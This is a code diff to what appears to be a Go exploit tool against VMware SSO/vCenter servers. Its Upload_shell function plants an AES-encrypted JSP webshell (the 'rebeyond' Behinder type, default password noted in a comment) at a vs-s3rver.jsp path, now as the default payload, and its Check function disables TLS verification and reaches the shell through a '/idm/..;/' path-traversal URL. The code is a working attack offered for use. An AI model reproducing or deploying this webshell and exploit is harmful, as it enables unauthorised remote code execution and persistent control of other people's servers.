@@ -90,8 +90,9 @@ func Upload_shell(url, log_param, agent_name, wb_str string) {
 	webshell := ""
 	if len(wb_str) > 1 {
 		webshell = wb_str
+	} else {
+		webshell = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
 	}
-	webshell = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
 	webshell_str := str_to_escape(webshell)
 	manifest_data := get_data(generate_manifest("/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/vs-s3rver.jsp", webshell_str))
 	_ = manifest_data
@@ -206,6 +207,7 @@ func Check(url string) {
 	client := req.C()
 	client.SetProxyURL(Proxy_server)
 	client.SetTimeout(2 * time.Second)
+	client.EnableInsecureSkipVerify()
 	shell_url := url + "/idm/..;/" + "vs-s3rver.jsp"
 	resp, err := client.R().
 		Get(shell_url)
